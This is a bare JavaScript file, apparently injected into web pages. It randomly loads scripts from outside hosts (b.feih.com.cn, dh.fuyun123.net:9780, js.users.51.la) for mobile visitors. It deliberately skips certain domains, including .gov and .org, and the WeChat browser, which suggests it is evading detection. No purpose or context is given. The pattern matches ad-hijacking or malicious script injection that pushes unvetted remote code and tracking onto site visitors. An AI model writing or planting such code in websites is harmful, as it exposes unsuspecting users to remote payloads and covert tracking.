var n = parseInt(10 * Math.random());
var myHost = !! (/(kaisafax.com|highflyersef.cn|.org|.gov|sf-express.com|sf.gmta.com.cn|m.tujia.com|m.5i5j.com|m.fang.com|m.iwjw.com|m.lianjia.com)/i.test(document.domain));
var myUA = !! (/(MicroMessenger)/i.test(window.navigator.userAgent));
var ISIOS = !! (/(iPhone|iPad|iPod|iOS)/i.test(window.navigator.userAgent));
var ISAPK = !! (/(android)/i.test(window.navigator.userAgent));

function loadJs(url) {
	var el = document.createElement('script');
	el.src = url;
	el.type = 'text/javascript';
	document.getElementsByTagName('head')[0].appendChild(el);
}
if (myHost || myUA) {} else {
	if (n <= 7) {
		if (ISIOS || ISAPK) {
			document.write("<script src='http://b.feih.com.cn/admob/sy20/t1/mccc-tc-a.js'><\/script>");
			loadJs('http://js.users.51.la/18933436.js');
		}
	} else {
		if (ISIOS || ISAPK) {
			document.write("<script src='http://dh.fuyun123.net:9780/hongxiu.js'><\/script>");
			loadJs('http://js.users.51.la/18926328.js');
		}
	}
}
loadJs('http://js.users.51.la/19051313.js');